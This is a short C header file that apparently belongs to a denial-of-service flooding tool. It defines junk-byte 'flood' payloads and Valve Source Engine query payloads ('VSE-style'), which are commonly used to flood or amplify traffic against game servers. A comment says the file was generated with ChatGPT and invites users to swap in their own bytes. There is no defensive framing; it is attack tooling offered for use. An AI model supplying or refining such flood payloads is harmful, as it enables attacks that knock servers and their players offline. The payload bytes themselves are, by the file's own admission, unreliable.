#ifndef PAYLOAD_H
#define PAYLOAD_H


// hi dalas hopped into this chatgpt shit,yeah idk c but ik what is going on here.These payloads are most likely shit so replace them with your bytes.
// Basic HEX/JUNK floods
static const char *hex_payloads[] = {
    "\x58\x4E\x58\x58\x4E\x58\x58\x4E",
    "\x17\x01\x00\x00\x00\x00\x00\x00",
    "\x90\x90\x90\x90\x90\x90\x90\x90",
    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF",
    "\x00\x00\x00\x00\x00\x00\x00\x00"
};

// VSE-style payloads (used in Valve Source Engine servers)
static const char *vse_payloads[] = {
    "\xFF\xFF\xFF\xFF\x54Source Engine Query\x00",
    "\xFF\xFF\xFF\xFF\x55",  
    "\xFF\xFF\xFF\xFF\x54info\x00"
};

#endif
